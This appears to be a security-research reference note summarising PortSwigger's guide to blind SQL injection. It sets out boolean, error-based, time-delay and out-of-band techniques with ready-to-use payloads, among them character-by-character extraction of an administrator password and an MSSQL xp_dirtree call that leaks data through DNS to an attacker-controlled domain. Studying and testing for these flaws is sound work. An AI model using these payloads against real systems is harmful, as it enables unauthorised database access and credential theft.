# Blind SQLi: boolean, conditional/verbose/CAST error, time delay, and OAST exfiltration

- **Vuln type / sub-variant:** blind SQLi (no query results or DB errors in the response): boolean-based, error-based, time-based, out-of-band (OAST)
- **Target type:** apps that run a query but only reflect a behavioural difference (a "Welcome back" flag, an error page, response timing) or nothing at all (async query)
- **Recon signal:** a value (e.g. a `TrackingId` cookie) is used in a query but its result is not shown; the app behaves differently on true vs false, or on error, or takes longer
- **Root cause:** input alters the query, and even without visible output the attacker can infer one bit at a time
- **Exploitation steps:**
  1. Boolean: `xyz' AND '1'='1` (true -> "Welcome back") vs `xyz' AND '1'='2` (false). Extract a char: `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm` (binary-search the range).
  2. Conditional error: `xyz' AND (SELECT CASE WHEN (COND) THEN 1/0 ELSE 'a' END)='a` (divide-by-zero only if true).
  3. Verbose/CAST error: a misconfigured DB leaks the query in the error; `CAST((SELECT col FROM t) AS int)` leaks a string in the type error ("invalid input syntax for integer: ...").
  4. Time: MSSQL `'; IF (1=1) WAITFOR DELAY '0:0:10'--`; extract with a CASE around the delay.
  5. OAST: when the query is async, trigger a DNS lookup you control, e.g. MSSQL `'; exec master..xp_dirtree '//<data>.<collab>/a'--`, and exfiltrate data in the subdomain.
- **Bypasses used:** `SUBSTRING`/`SUBSTR`, `CASE`, DB-specific delay/DNS functions; OAST works where all else fails
- **Impact:** full data extraction one bit/char at a time; OAST allows direct exfiltration
- **Bounty:** reference (not a single finding)
- **Lesson / pattern:** pick the blind channel by what the app reveals: a visible difference -> boolean; a catchable error -> conditional/CAST error; graceful errors -> time; async/nothing -> OAST (prefer OAST anyway for speed and direct exfiltration via DNS). All DB-specific; see the cheat sheet.
- **Source:**
  - Title: Blind SQL injection
  - Author: PortSwigger Web Security Academy
  - URL: https://portswigger.net/web-security/sql-injection/blind
  - Date: reference (scraped 2026-11-19)
  - Raw file: `sources/sqli/03-portswigger-blind-sql-injection.md`

Tags: blind, boolean-blind, error-based, conditional-error, cast-error, time-based, oob-oast, substring-extraction, binary-search, xp-dirtree, burp-collaborator, reference, methodology
